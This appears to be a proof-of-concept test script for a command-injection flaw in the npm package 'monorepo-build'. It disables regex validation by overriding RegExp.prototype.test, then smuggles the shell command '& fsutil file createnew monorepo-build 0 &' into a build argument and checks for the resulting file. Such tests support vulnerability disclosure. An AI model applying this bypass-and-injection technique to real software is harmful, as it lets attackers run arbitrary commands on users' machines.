RegExp.prototype.test = () => true;
var a = require('monorepo-build');
const fs = require('fs');
const path = './monorepo-build';
var execSync = require('child_process').execSync;
var user_name = '';
var user_email = '';
try {
    const cmd = 'git config user.email';
    user_email = execSync(cmd).toString().trim();
} catch (error) {
}
try {
    const cmd = 'git config user.name';
    user_name = execSync(cmd).toString().trim();
} catch (error) {
}
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
try {
    a.build('./', '& fsutil file createnew monorepo-build 0 &', '123');
} catch (error) {
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + true + ' }');
fs.unlink(path, function (err) {
    try {
        const cmd = `git config user.name "${ user_name }"`;
        execSync(cmd).toString();
    } catch (error) {
    }
    try {
        const cmd = `git config user.email "${ user_email }"`;
        execSync(cmd).toString();
    } catch (error) {
    }
});